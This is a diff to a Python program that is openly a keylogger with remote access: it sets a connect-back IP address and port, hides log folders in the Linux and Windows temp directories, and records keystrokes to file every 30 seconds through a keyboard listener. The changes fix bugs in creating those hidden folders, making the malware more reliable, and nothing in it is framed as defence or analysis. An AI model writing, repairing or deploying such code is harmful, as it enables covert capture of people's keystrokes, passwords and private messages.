@@ -27,7 +27,7 @@ SYSTEM = system() # The operating this program is being ran on.
 IP = '192.168.31.134' # IP address to connect to.
 PORT = 1337 # Port number to create socket with.
 LIN_DIR = '/tmp/.folder/' # Hidden Linux folder to create for our keylogger.
-WIN_DIR = r'%temp%\.folder\\' # Hideen Windows folder to create for our keylogger.
+WIN_DIR = r'%temp%\.folder' # Hideen Windows folder to create for our keylogger.
 SECONDS_TO_LOG = 30 # Number of the seconds to wait before logging keystrokes to file.
 LOG = '' # Will store the keystrokes of the user.
 COMMMAND_SIZE = 1024 # Maximum number of bytes the command can be.
@@ -204,9 +204,11 @@ def keylogger():
 	listener = keyboard.Listener(on_press=on_press) # Creating keystrokes listener object in context manager.
 	try:
 		if SYSTEM == 'Linux':
-			os.mkdir(LIN_DIR) # Attempt to create hidden directory in Linux temp folder.
+			if not os.path.exists(LIN_DIR):
+				os.mkdir(LIN_DIR) # Attempt to create hidden directory in Linux temp folder.
 		else:
-			os.mkdir(WIN_DIR) # Attempt to create hidden direcotry in Windows temp folder.
+			if not os.path.exists(WIN_DIR):
+				os.makedirs(WIN_DIR) # Attempt to create hidden direcotry in Windows temp folder.
 		log_to_file() # Begin thread for logging to file every 30s.
 		listener.start() # Collent keystrokes until program exit.
 	except OSError: # Ignore os error.
